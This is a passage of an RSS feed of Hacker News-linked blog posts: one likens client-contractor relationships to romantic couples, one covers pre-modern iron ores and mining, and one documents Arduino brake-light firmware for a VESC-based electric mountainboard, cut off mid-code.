<blockquote><p>In every couple you will often find one person who is more in touch with the <em>fear of losing the other</em>, and one person who is more in touch with the <em>fear of losing themselves</em>. </p><p>One person more in touch with the <em>fear of abandonment</em>, and one person more in touch with the <em>fear of suffocation</em>.</p><cite>Esther Perel (<a href="https://tim.blog/2018/06/01/the-tim-ferriss-show-transcripts-esther-perel/#:~:text=Every%20couple%20has%20a%20setup.%20It%E2%80%99s%20an%20organization.%20In%20every%20couple%20you%20will%20often%20find%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20the%20other%2C%20and%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20themselves.%20One%20person%20more%20in%20touch%20with%20the%20fear%20of%20abandonment%2C%20and%20one%20person%20more%20in%20touch%20with%20the%20fear%20of%20suffocation">transcript here</a>)</cite></blockquote>



<p>Are client relationships like that? I think so. It could go either way:</p>



<ul><li>The client is afraid that the contractor whom they rely on will move onto a higher paying or more interesting client (<em>fear of abandonment</em>)</li><li>The contractor is afraid that continuing to work with their client will prevent them from growing and learning new things (<em>fear of suffocation</em>)</li></ul>



<p>Or, going the other way:</p>



<ul><li>The client is afraid that the contractor‚Äôs low quality work or outdated solutions will hold them back (<em>fear of suffocation</em>)</li><li>The contractor is afraid that the client will fire them and hire someone selling shiny new unproven technology (<em>fear of abandonment</em>)</li></ul>



<p>Does any of that sound familiar? It does to me.</p>



<p>Who holds the most power in those situations? Obviously we‚Äôd prefer that whatever side we‚Äôre on has the power. But ideally both sides would hold equal power, so neither side needs to act out of fear.</p>



<p>It sounds like a chicken/egg problem: do we equalize power by getting rid of fear, or do we get rid of fear by equalizing power? But that‚Äôs a false dichotomy. Those are both symptoms of the larger issue: we aren‚Äôt communicating. Fix the communication and we fix both symptoms of it.</p>



<p>In a romantic relationship, we‚Äôd want to talk about this stuff, right? Get it out in the open and have a mature, honest conversation. Maybe even see a relationship counselor. </p>



<p>So why not do that with our client? It goes back to my post ‚Äú<a href="https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/">Hide a problem from your client and now you‚Äôve got 2&nbsp;problems</a>‚Äú. If we‚Äôre feeling a fear of suffocation or abandonment, or we suspect that they are, why wouldn‚Äôt we bring it up and talk through it with them?</p>



<p>What do you think? <a href="https://twitter.com/mcrittenden">Tweet me</a>!</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/18/dating-our-clients/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517907</guid>
            <pubDate>Fri, 18 Sep 2020 15:20:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iron, How Did They Make It? Part I, Mining]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 44 (<a href="https://news.ycombinator.com/item?id=24517792">thread link</a>) | @dddddaviddddd
<br/>
September 18, 2020 | https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman‚Äôs hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> ‚Äì as indeed, it tends to render <em>most</em> ancient forms of production invisible ‚Äì <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn‚Äôt really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



<p><strong>So this first post is going to focus on mining</strong>.  Next week we‚Äôll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we‚Äôll look at the basic principles behind forging.  And finally in the last week, we‚Äôll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>



<figure><img data-attachment-id="4507" data-permalink="https://acoup.blog/saam-1910-9-11_1/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg" data-orig-size="800,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="saam-1910.9.11_1" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" src="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg 800w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=768 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><a href="https://americanart.si.edu/artwork/iron-mine-port-henry-new-york-16373">Via the Smithsonian</a>, a painting of an iron mine by Homer Dodge Martin (c. 1862) at Port Henry, New York.  By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or ‚Äì more broadly ‚Äì on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>





<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don‚Äôt have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, ‚ÄúMining and Metallurgy in medieval Civilisation‚Äù in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, ‚Äú‚ÄòHorrible, Speculative, Nasty, Dangerous‚Äô: Assessing the Value of Roman Iron,‚Äù <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth‚Äôs crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces ‚Äì and I mean this very literally ‚Äì a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that‚Äôs the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we‚Äôll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that‚Äôs why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We‚Äôll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let‚Äôs get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‚Äònative‚Äô metal; the term for this, ‚Äú<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>‚Äù is an accurate description of where it comes from (there is also one known deposit of native ‚Äò<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‚Äò); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‚Äòpure‚Äô iron may be disregarded as a meaningful source of iron.</p>



<figure><img data-attachment-id="4509" data-permalink="https://acoup.blog/hematite_streak_plate/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg" data-orig-size="1280,547" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon PowerShot SX710 HS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1451453273&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.5&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="hematite_streak_plate" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Hematite">Via Wikipedia</a>, Hematite, leaving its characteristic red-rust streak.  The hematite on the left has a metallic lustre, whereas the hematite on the right has the (more common) earthy lustre.</figcaption></figure>



<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)¬∑<em>n</em>H<sub>2</sub>O) close behind.  Rarer, but still used was ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517792</guid>
            <pubDate>Fri, 18 Sep 2020 15:13:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evening Project: Arduino based brake light controller for Electric Mountainboard]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517767">thread link</a>) | @gcds
<br/>
September 18, 2020 | https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: Arduino based brake light controller for VESC based Electric Mountainboard">
            </figure>

            <section>
                <div>
                    <p>I had a small request from my father to help him develop a small firmware for Arduino to control brake LED light for his electric mountain board, integrating with VESC to receive remote controller UART packets.</p><h2 id="some-explanations">Some explanations</h2><p>I know some of you have not heard Arduino, VESC, Electric Mountainboard, and similar terms.</p><h3 id="arduino">Arduino</h3><p><a href="https://www.arduino.cc/">Arduino</a> is an open-source hardware and software project and user community that designs and manufactures single-board microcontrollers and microcontroller kits for building digital devices.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-71.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-71.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-71.png 1000w, https://www.techprowd.com/content/images/2020/09/image-71.png 1020w" sizes="(min-width: 720px) 720px"></figure><p>In this project, our target will be the Arduino Pro Micro board based on the <a href="https://www.microchip.com/wwwproducts/en/ATmega32u4">ATMega32U4</a> processor featuring 32 KB self-programming flash program memory, 2.5 KB SRAM, 1 KB EEPROM, USB 2.0 full-speed/low-speed device, 12-channel 10-bit A/D-converter, and JTAG interface for on-chip-debug. The device achieves up to 16 MIPS throughput at 16 MHz. 2.7-5.5 volt operation.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-72.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-72.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-72.png 1000w, https://www.techprowd.com/content/images/2020/09/image-72.png 1032w" sizes="(min-width: 720px) 720px"></figure><h3 id="vesc">VESC</h3><p>The <a href="https://vesc-project.com/">VESC</a> (which stands for Vedder Electronic Speed Controller) is a more advanced ESC that allows for better motor and battery protection, regenerative braking, and programming options like acceleration-deceleration curves and other advanced features.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-73.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-73.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-73.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-73.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-73.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>It is an open-source ESC project and has many hardware projects based on its firmware.</p><h3 id="electric-mountainboard">Electric Mountainboard</h3><p>The Electric mountainboard, in simple terms, is an electrified mountainboard.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg" width="4032" height="2877" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg" width="768" height="1024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 768w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>Mountainboarding, also known as Dirtboarding, Offroad Boarding, and All-Terrain Boarding (ATB), is a well established[1] if little-known action sport, derived from snowboarding. This was initially pioneered by James Stanley during a visit in the 1900s to the Matterhorn where snow was not available. A mountainboard is made up of components including a deck, bindings to secure the rider to the deck, four wheels with pneumatic tires, and two steering mechanisms known as trucks. Mountainboarders, also known as riders, ride specifically designed boardercross tracks, slopestyle parks, grass hills, woodlands, gravel tracks, streets, skateparks, ski resorts, BMX courses, and mountain bike trails. It is this ability to ride such a variety of terrain that makes mountainboarding different from other board sports.</p><h2 id="remote-controller">Remote Controller</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-77.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-77.png 600w, https://www.techprowd.com/content/images/2020/09/image-77.png 768w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-leading-subject-the-brake-light">The leading subject the Brake Light</h2><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.18.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.18.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.13.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.13.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.26.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.26.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg 1280w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>This article's main subject is brake light, which is needed to work like car brake lights.</p><ul><li>Then the board is powered, it should shine with the brightness of around 45%</li><li>When the remote controller starts sending a brake signal, the Arduino should pick up the packets from the remote controller receiver, which are being sent to VESC and set brightness to 100% and return to 45% when the brake signal is released.</li></ul><p>The LED lamp is powered by the Mean Well LDD-H series LED driver, which can control LED brightness by providing a PWM signal.</p><p>The board is powered by 12S Li-Ion cells based battery pack with a standard voltage of 44.4V and a fully charged voltage of 50.4V.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-75.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-75.png 600w, https://www.techprowd.com/content/images/2020/09/image-75.png 1000w" sizes="(min-width: 720px) 720px"></figure><h2 id="schematic">Schematic</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-76.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-76.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-76.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-76.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-76.png 2400w"></figure><p>The schematic idea is pretty simple. Arduino receives the same packets as VESC from receiver via <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a>, from which I can decode the throttle position and accordingly adjust brake lights via <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">PWM</a> signal on LED driver.</p><h2 id="firmware">Firmware</h2><p>For firmware, I will be using Arduino software to write the firmware with C++ with some helper functions, instead of bit-banging registers by myself.</p><h3 id="first-step-vesc-packet-listener-handler">First step Vesc Packet Listener &amp; Handler</h3><p>To determine the throttle position of the Remote controller, I need to parse incoming serial data from the receiver as this type of remote controller uses VESC UART style control instead of a typical PPM (RC controller similar to PWM) style control mechanism.</p><p>I have built a small class to parse incoming serial data and extract the payload out of the received packet. I used <a href="https://github.com/SolidGeek/VescUart">SolidGeek/VescUart</a> library as a reference for the code. Added some magic to be able quickly to hook callback when a specific type of commands there received.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523pragma%2520once%250A%250A%2523include%2520%253CHardwareSerial.h%253E%250A%2523include%2520%2522vesc_types.h%2522%250A%250Atypedef%2520void%2520(*vesc_command_handler_callback)(uint8_t%2520*payload%252C%2520uint16_t%2520length)%253B%250A%250Atypedef%2520struct%2520%257B%250A%2520%2520%2520%2520vesc_command_id%2520commandId%253B%250A%2520%2520%2520%2520vesc_command_handler_callback%2520callback%253B%250A%257D%2520vesc_command_handler%253B%250A%250Aclass%2520VescUart%2520%257B%250Apublic%253A%250A%2520%2520%2520%2520explicit%2520VescUart(HardwareSerial%2520*port)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520malloc(sizeof(vesc_command_handler))%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlerSize%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253Eport%2520%253D%2520port%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520void%2520addCommandHandler(vesc_command_id%2520commandId%252C%2520vesc_command_handler_callback%2520callback)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520vesc_command_handler%2520handler%2520%253D%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.commandId%2520%253D%2520commandId%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.callback%2520%253D%2520callback%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520realloc(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(this-%253EcommandHandlerSize%2520%252B%25201)%2520*%2520sizeof(vesc_command_handler)%250A%2520%2520%2520%2520%2520%2520%2520%2520)%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bthis-%253EcommandHandlerSize%252B%252B%255D%2520%253D%2520handler%253B%250A%2520%2520%2520%2520%257D%250A%250A%250A%2520%2520%2520%2520bool%2520checkVescPacket()%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520payload%255B256%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520payloadSize%2520%253D%2520receivePacket(payload)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520(payloadSize%2520%253E%25200)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520commandId%2520%253D%2520payload%255B0%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520for%2520(uint8_t%2520i%2520%253D%25200%253B%2520i%2520%253C%2520this-%253EcommandHandlerSize%253B%2520i%252B%252B)%2520%257B%250A%2520%